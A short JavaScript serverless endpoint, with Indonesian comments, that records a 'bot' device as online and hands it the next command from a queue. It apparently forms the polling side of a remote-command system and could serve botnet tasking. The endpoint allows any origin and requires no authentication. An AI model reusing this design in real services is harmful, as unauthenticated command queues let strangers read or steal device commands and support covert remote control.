import { kv } from '@vercel/kv';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { deviceId } = req.query;
    
    if (!deviceId) {
      return res.status(400).json({ error: 'Device ID required' });
    }

    // Update last seen bot
    await kv.hset(`bot:${deviceId}`, { lastSeen: Date.now(), online: true });

    // Ambil command pertama dari queue
    const commandKey = `cmd:${deviceId}`;
    const commands = await kv.lrange(commandKey, 0, 0);
    
    if (commands && commands.length > 0) {
      const command = JSON.parse(commands[0]);
      
      // Hapus command dari queue
      await kv.lpop(commandKey);
      
      // Simpan ke history
      await kv.lpush('commands:history', JSON.stringify({
        ...command,
        deviceId,
        status: 'sent',
        timestamp: Date.now()
      }));
      
      return res.json(command);
    }

    // No pending commands
    res.json({});

  } catch (error) {
    console.error('Poll error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}
